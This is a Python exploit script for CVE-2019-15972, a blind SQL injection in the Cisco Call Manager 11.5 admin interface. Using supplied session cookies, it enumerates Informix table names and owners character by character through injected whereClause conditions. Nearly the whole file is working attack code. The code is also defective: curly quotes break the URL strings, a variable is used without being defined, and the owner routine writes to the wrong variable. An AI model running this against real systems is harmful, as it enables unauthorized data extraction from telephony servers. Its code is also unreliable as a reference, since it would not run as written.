#!/usr/bin/python3
# Author - Ken Gannon of F-Secure
import requests
import time

print('Informix SQL Injection script for Cisco Call Manager 11.5. You must have access to https://<cucm_endpoint>/ccmadmin/')
print('(CVE-2019-15972)')
print('This script will do the following:')
print('[*] Enumerate the names of each table')
print('[*] Write the name of each table to a file called "cisco_tables.txt"')
print('[*] Note that this script will run indefinitely. It is up to the user to cancel this script')
print('[*] Also after submitting your cookies to this script, make sure you close all browsers that are using your submitted cookies')
cookie1=input('Input your JSESSIONID cookie and press enter (if null then enter a random alphanumeric value): ')
cookie2=input('Input your com.cisco.ccm.admin.servlets.RequestToken.REQUEST_TOKEN_KEY cookie and press enter: ')
cookie3=input('Input your JSESSIONIDSSO cookie and press enter (if null then enter a random alphanumeric value): ')
endpoint=input('Input the IP address or FQDN of the endpoint and press enter: ')
path = './cisco_tables.txt'

#refresh the cisco cookie
#the com.cisco.ccm.admin.servlets.RequestToken.REQUEST_TOKEN_KEY cookie needs to be refresh every so often, and can be refreshed via GET request
def refresh_cookie(cookie1, cookie2, cookie3):
	theRequest_url = "https://” + str(endpoint) + “:443/ccmadmin/userGroupFindList.do?searchLimVal3=&searchLimVal4=&whereClause=1=1&searchLimVal1=&searchLimVal2=&searchLimVal7=&searchLimVal8=&searchLimVal5=&searchLimVal6=&rowsPerPageControl=/ccmadmin/userGroupFindList.do?lookup=true&colCnt=4&lookup=true&searchLimVal0=&rowsPerPage=50&pageNumber=1&searchLimVal9=&recCnt=37&multiple=true"
	theRequest_cookies = {"JSESSIONID": cookie1, "com.cisco.ccm.admin.servlets.RequestToken.REQUEST_TOKEN_KEY": cookie2, "JSESSIONIDSSO": cookie3}
	theRequest_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Connection": "close", "Upgrade-Insecure-Requests": "1"}
	response = requests.get(theRequest_url, headers=theRequest_headers, cookies=theRequest_cookies, verify=False)
	newCookie = response.headers['Set-Cookie']
	newCookie = newCookie[60:]
	newCookie = newCookie[:20]
	newCookie = newCookie.replace(";","")
	newCookie = newCookie.replace(" ","")
	newCookie = newCookie.replace("P","")
	newCookie = newCookie.replace("a","")
	newCookie = newCookie.replace("t","")
	newCookie = newCookie.replace("h","")
	return newCookie

def database_name(cookie1, cookie2, cookie3, numberOfDatabases):
	asciiCharacter = 64
	asciiCounter = 1
	characterPosition = 1
	databaseName = ""
	while True:
		#verify if the character itself is correct
		cookie2 = refresh_cookie(cookie1, cookie2, cookie3)
		theRequest_url = "https://” + str(endpoint) + “:443/ccmadmin/userGroupFindList.do?searchLimVal3=&searchLimVal4=&whereClause=1=1%20AND%20(select%20ascii(substring(tabname%20from%20" + str(characterPosition) + "%20for%201))%20from%20systables%20where%20tabid%20=%20" + str(numberOfDatabases) + ")%20%3D%20" + str(asciiCharacter) + "&searchLimVal1=&searchLimVal2=&searchLimVal7=&searchLimVal8=&searchLimVal5=&searchLimVal6=&rowsPerPageControl=/ccmadmin/userGroupFindList.do?lookup=true&colCnt=4&searchLimVal0=&lookup=true&rowsPerPage=50&searchLimVal9=&pageNumber=1&recCnt=37&multiple=true"
		theRequest_cookies = {"JSESSIONID": cookie1, "com.cisco.ccm.admin.servlets.RequestToken.REQUEST_TOKEN_KEY": cookie2, "JSESSIONIDSSO": cookie3}
		theRequest_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Referer": "https://” + str(endpoint) + “:443/ccmadmin/userGroupFindList.do?searchLimVal3=&searchLimVal4=&whereClause=&searchLimVal1=&searchLimVal2=&searchLimVal7=&searchLimVal8=&searchLimVal5=&searchLimVal6=&rowsPerPageControl=/ccmadmin/userGroupFindList.do?lookup=true&colCnt=4&lookup=true&searchLimVal0=&rowsPerPage=50&pageNumber=1&searchLimVal9=&recCnt=37&multiple=true", "Content-Type": "application/x-www-form-urlencoded", "Connection": "close", "Upgrade-Insecure-Requests": "1"}
		theRequest_data={"rowsPerPageControl": "/ccmadmin/userGroupFindList.do?lookup=true&multiple=true&whereClause=&rowsPerPage=50&pageNumber=1", "rowsVisible": "1", "primaryTable": "dirGroup", "dispCols": "pkid#name#minimumuserrank#isStandard", "searchField0": "name", "searchLimVal0": "beginsWith", "searchLimit0": "beginsWith", "searchString0": '', "searchField1": "name", "searchLimVal1": "beginsWith", "searchLimit1": "beginsWith", "searchString1": '', "searchField2": "name", "searchLimVal2": "beginsWith", "searchLimit2": "beginsWith", "searchString2": '', "searchField3": "name", "searchLimVal3": "beginsWith", "searchLimit3": "beginsWith", "searchString3": '', "searchField4": "name", "searchLimVal4": "beginsWith", "searchLimit4": "beginsWith", "searchString4": '', "searchField5": "name", "searchLimVal5": "beginsWith", "searchLimit5": "beginsWith", "searchString5": '', "searchField6": "name", "searchLimVal6": "beginsWith", "searchLimit6": "beginsWith", "searchString6": '', "searchField7": "name", "searchLimVal7": "beginsWith", "searchLimit7": "beginsWith", "searchString7": '', "searchField8": "name", "searchLimVal8": "beginsWith", "searchLimit8": "beginsWith", "searchString8": '', "searchField9": "name", "searchLimVal9": "beginsWith", "searchLimit9": "beginsWith", "searchString9": ''}
		response = requests.post(theRequest_url, headers=theRequest_headers, cookies=theRequest_cookies, data=theRequest_data, verify=False)
		responseLength = len(response.content)
		if responseLength > 60000:
			#character was valid. move onto the next character
			print('[*] character found: ' + chr(asciiCharacter))
			databaseName = databaseName + chr(asciiCharacter)
			characterPosition = characterPosition + 1
			asciiCharacter = 64
			asciiCounter = 1
		else:
			#do the name enumeration
			cookie2 = refresh_cookie(cookie1, cookie2, cookie3)
			theRequest_url = "https://” + str(endpoint) + “:443/ccmadmin/userGroupFindList.do?searchLimVal3=&searchLimVal4=&whereClause=1=1%20AND%20(select%20ascii(substring(tabname%20from%20" + str(characterPosition) + "%20for%201))%20from%20systables%20where%20tabid%20=%20" + str(numberOfDatabases) + ")%20%3E%20" + str(asciiCharacter) + "&searchLimVal1=&searchLimVal2=&searchLimVal7=&searchLimVal8=&searchLimVal5=&searchLimVal6=&rowsPerPageControl=/ccmadmin/userGroupFindList.do?lookup=true&colCnt=4&searchLimVal0=&lookup=true&rowsPerPage=50&searchLimVal9=&pageNumber=1&recCnt=37&multiple=true"
			theRequest_cookies = {"JSESSIONID": cookie1, "com.cisco.ccm.admin.servlets.RequestToken.REQUEST_TOKEN_KEY": cookie2, "JSESSIONIDSSO": cookie3}
			theRequest_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Referer": "https://” + str(endpoint) + “:443/ccmadmin/userGroupFindList.do?searchLimVal3=&searchLimVal4=&whereClause=&searchLimVal1=&searchLimVal2=&searchLimVal7=&searchLimVal8=&searchLimVal5=&searchLimVal6=&rowsPerPageControl=/ccmadmin/userGroupFindList.do?lookup=true&colCnt=4&lookup=true&searchLimVal0=&rowsPerPage=50&pageNumber=1&searchLimVal9=&recCnt=37&multiple=true", "Content-Type": "application/x-www-form-urlencoded", "Connection": "close", "Upgrade-Insecure-Requests": "1"}
			theRequest_data={"rowsPerPageControl": "/ccmadmin/userGroupFindList.do?lookup=true&multiple=true&whereClause=&rowsPerPage=50&pageNumber=1", "rowsVisible": "1", "primaryTable": "dirGroup", "dispCols": "pkid#name#minimumuserrank#isStandard", "searchField0": "name", "searchLimVal0": "beginsWith", "searchLimit0": "beginsWith", "searchString0": '', "searchField1": "name", "searchLimVal1": "beginsWith", "searchLimit1": "beginsWith", "searchString1": '', "searchField2": "name", "searchLimVal2": "beginsWith", "searchLimit2": "beginsWith", "searchString2": '', "searchField3": "name", "searchLimVal3": "beginsWith", "searchLimit3": "beginsWith", "searchString3": '', "searchField4": "name", "searchLimVal4": "beginsWith", "searchLimit4": "beginsWith", "searchString4": '', "searchField5": "name", "searchLimVal5": "beginsWith", "searchLimit5": "beginsWith", "searchString5": '', "searchField6": "name", "searchLimVal6": "beginsWith", "searchLimit6": "beginsWith", "searchString6": '', "searchField7": "name", "searchLimVal7": "beginsWith", "searchLimit7": "beginsWith", "searchString7": '', "searchField8": "name", "searchLimVal8": "beginsWith", "searchLimit8": "beginsWith", "searchString8": '', "searchField9": "name", "searchLimVal9": "beginsWith", "searchLimit9": "beginsWith", "searchString9": ''}
			response = requests.post(theRequest_url, headers=theRequest_headers, cookies=theRequest_cookies, data=theRequest_data, verify=False)
			responseLength = len(response.content)
			if responseLength > 60000:
			#ascii character found
				asciiCharacter = asciiCharacter + (64 / (2**int(asciiCounter)))
				asciiCharacter = int(asciiCharacter)
				asciiCounter = asciiCounter + 1
			else:
			#ascii character not found
				asciiCharacter = asciiCharacter - (64 / (2**int(asciiCounter)))
				asciiCharacter = int(asciiCharacter)
				asciiCounter = asciiCounter + 1
			if asciiCharacter == 0:
				if len(databaseName) < 1:
					numberOfDatabases = int(numberOfDatabases) + 1
					asciiCharacter = 64
					asciiCounter = 1
					characterPosition = 1
					databaseName = ""
				else:
					print('[*] end of table, name: ' + databaseName)
					#end of database name. get the database owner
					databaseOwner, cookie2 = database_owner(cookie1, cookie2, cookie3, databaseName).split()
					#finished
					print('[*] owner of table: ' + databaseOwner)
					print('[*] remaining databases: ' + str(int(numberOfDatabases) - 1))
					result = "table number: " + str(numberOfDatabases) + " table name: " + databaseName + " table owner: " + databaseOwner + "\n"
					writeToFile = open(path,'a')
					writeToFile.write(result)
					writeToFile.close()
					numberOfDatabases = int(numberOfDatabases) + 1
					asciiCharacter = 64
					asciiCounter = 1
					characterPosition = 1
					databaseName = ""

def database_owner(cookie1, cookie2, cookie3, databaseName):
	print("[*] finding table owner")
	asciiCharacter = 64
	asciiCounter = 1
	characterPosition = 1
	databaseOwner = ""
	while True:
		#verify if the character itself is correct
		cookie2 = refresh_cookie(cookie1, cookie2, cookie3)
		theRequest_url = "https://” + str(endpoint) + “:443/ccmadmin/userGroupFindList.do?searchLimVal3=&searchLimVal4=&whereClause=1=1%20AND%20(select%20ascii(substring(owner%20from%20" + str(characterPosition) + "%20for%201))%20from%20systables%20where%20tabname%20=%20" + str(databaseName) + ")%20%3D%20" + str(asciiCharacter) + "&searchLimVal1=&searchLimVal2=&searchLimVal7=&searchLimVal8=&searchLimVal5=&searchLimVal6=&rowsPerPageControl=/ccmadmin/userGroupFindList.do?lookup=true&colCnt=4&searchLimVal0=&lookup=true&rowsPerPage=50&searchLimVal9=&pageNumber=1&recCnt=37&multiple=true"
		theRequest_cookies = {"JSESSIONID": cookie1, "com.cisco.ccm.admin.servlets.RequestToken.REQUEST_TOKEN_KEY": cookie2, "JSESSIONIDSSO": cookie3}
		theRequest_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Referer": "https://” + str(endpoint) + “:443/ccmadmin/userGroupFindList.do?searchLimVal3=&searchLimVal4=&whereClause=&searchLimVal1=&searchLimVal2=&searchLimVal7=&searchLimVal8=&searchLimVal5=&searchLimVal6=&rowsPerPageControl=/ccmadmin/userGroupFindList.do?lookup=true&colCnt=4&lookup=true&searchLimVal0=&rowsPerPage=50&pageNumber=1&searchLimVal9=&recCnt=37&multiple=true", "Content-Type": "application/x-www-form-urlencoded", "Connection": "close", "Upgrade-Insecure-Requests": "1"}
		theRequest_data={"rowsPerPageControl": "/ccmadmin/userGroupFindList.do?lookup=true&multiple=true&whereClause=&rowsPerPage=50&pageNumber=1", "rowsVisible": "1", "primaryTable": "dirGroup", "dispCols": "pkid#name#minimumuserrank#isStandard", "searchField0": "name", "searchLimVal0": "beginsWith", "searchLimit0": "beginsWith", "searchString0": '', "searchField1": "name", "searchLimVal1": "beginsWith", "searchLimit1": "beginsWith", "searchString1": '', "searchField2": "name", "searchLimVal2": "beginsWith", "searchLimit2": "beginsWith", "searchString2": '', "searchField3": "name", "searchLimVal3": "beginsWith", "searchLimit3": "beginsWith", "searchString3": '', "searchField4": "name", "searchLimVal4": "beginsWith", "searchLimit4": "beginsWith", "searchString4": '', "searchField5": "name", "searchLimVal5": "beginsWith", "searchLimit5": "beginsWith", "searchString5": '', "searchField6": "name", "searchLimVal6": "beginsWith", "searchLimit6": "beginsWith", "searchString6": '', "searchField7": "name", "searchLimVal7": "beginsWith", "searchLimit7": "beginsWith", "searchString7": '', "searchField8": "name", "searchLimVal8": "beginsWith", "searchLimit8": "beginsWith", "searchString8": '', "searchField9": "name", "searchLimVal9": "beginsWith", "searchLimit9": "beginsWith", "searchString9": ''}
		response = requests.post(theRequest_url, headers=theRequest_headers, cookies=theRequest_cookies, data=theRequest_data, verify=False)
		responseLength = len(response.content)
		if responseLength > 60000:
			#character was valid. move onto the next character
			print('[*] character found: ' + chr(asciiCharacter))
			databaseName = databaseName + chr(asciiCharacter)
			characterPosition = characterPosition + 1
			asciiCharacter = 64
			asciiCounter = 1
		else:
			#do the name enumeration
			cookie2 = refresh_cookie(cookie1, cookie2, cookie3)
			theRequest_url = "https://” + str(endpoint) + “:443/ccmadmin/userGroupFindList.do?searchLimVal3=&searchLimVal4=&whereClause=1=1%20AND%20(select%20ascii(substring(owner%20from%20" + str(characterPosition) + "%20for%201))%20from%20systables%20where%20tabname%20=%20" + str(databaseName) + ")%20%3E%20" + str(asciiCharacter) + "&searchLimVal1=&searchLimVal2=&searchLimVal7=&searchLimVal8=&searchLimVal5=&searchLimVal6=&rowsPerPageControl=/ccmadmin/userGroupFindList.do?lookup=true&colCnt=4&searchLimVal0=&lookup=true&rowsPerPage=50&searchLimVal9=&pageNumber=1&recCnt=37&multiple=true"
			theRequest_cookies = {"JSESSIONID": cookie1, "com.cisco.ccm.admin.servlets.RequestToken.REQUEST_TOKEN_KEY": cookie2, "JSESSIONIDSSO": cookie3}
			theRequest_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Referer": "https://” + str(endpoint) + “:443/ccmadmin/userGroupFindList.do?searchLimVal3=&searchLimVal4=&whereClause=&searchLimVal1=&searchLimVal2=&searchLimVal7=&searchLimVal8=&searchLimVal5=&searchLimVal6=&rowsPerPageControl=/ccmadmin/userGroupFindList.do?lookup=true&colCnt=4&lookup=true&searchLimVal0=&rowsPerPage=50&pageNumber=1&searchLimVal9=&recCnt=37&multiple=true", "Content-Type": "application/x-www-form-urlencoded", "Connection": "close", "Upgrade-Insecure-Requests": "1"}
			theRequest_data={"rowsPerPageControl": "/ccmadmin/userGroupFindList.do?lookup=true&multiple=true&whereClause=&rowsPerPage=50&pageNumber=1", "rowsVisible": "1", "primaryTable": "dirGroup", "dispCols": "pkid#name#minimumuserrank#isStandard", "searchField0": "name", "searchLimVal0": "beginsWith", "searchLimit0": "beginsWith", "searchString0": '', "searchField1": "name", "searchLimVal1": "beginsWith", "searchLimit1": "beginsWith", "searchString1": '', "searchField2": "name", "searchLimVal2": "beginsWith", "searchLimit2": "beginsWith", "searchString2": '', "searchField3": "name", "searchLimVal3": "beginsWith", "searchLimit3": "beginsWith", "searchString3": '', "searchField4": "name", "searchLimVal4": "beginsWith", "searchLimit4": "beginsWith", "searchString4": '', "searchField5": "name", "searchLimVal5": "beginsWith", "searchLimit5": "beginsWith", "searchString5": '', "searchField6": "name", "searchLimVal6": "beginsWith", "searchLimit6": "beginsWith", "searchString6": '', "searchField7": "name", "searchLimVal7": "beginsWith", "searchLimit7": "beginsWith", "searchString7": '', "searchField8": "name", "searchLimVal8": "beginsWith", "searchLimit8": "beginsWith", "searchString8": '', "searchField9": "name", "searchLimVal9": "beginsWith", "searchLimit9": "beginsWith", "searchString9": ''}
			response = requests.post(theRequest_url, headers=theRequest_headers, cookies=theRequest_cookies, data=theRequest_data, verify=False)
			responseLength = len(response.content)
			if responseLength > 60000:
			#ascii character found
				asciiCharacter = asciiCharacter + (64 / (2**int(asciiCounter)))
				asciiCharacter = int(asciiCharacter)
				asciiCounter = asciiCounter + 1
			else:
			#ascii character not found
				asciiCharacter = asciiCharacter - (64 / (2**int(asciiCounter)))
				asciiCharacter = int(asciiCharacter)
				asciiCounter = asciiCounter + 1
			if asciiCharacter == 0:
				if not databaseOwner:
					databaseOwner = "NULL"
				print("[*] owner found: " + databaseOwner)
				return databaseOwner + " " + cookie2

database_name(cookie1, cookie2, cookie3, numberOfDatabases)
